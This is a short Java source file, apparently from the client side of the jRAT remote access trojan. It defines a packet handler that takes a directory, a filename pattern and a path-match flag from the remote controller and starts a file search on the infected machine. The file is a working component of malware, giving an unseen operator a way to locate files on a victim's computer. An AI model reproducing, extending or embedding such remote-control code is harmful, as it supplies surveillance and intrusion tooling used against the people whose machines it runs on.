package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.module.fs.FileSearch;

import java.io.File;


public class Packet53StartSearch implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String searchRoot = con.readLine();

		if (!searchRoot.endsWith(File.separator)) {
			searchRoot += File.separator;
		}

		String pattern = con.readLine();
		boolean searchPath = con.readBoolean();
		new FileSearch(con, searchRoot, pattern, searchPath).start();
	}

}
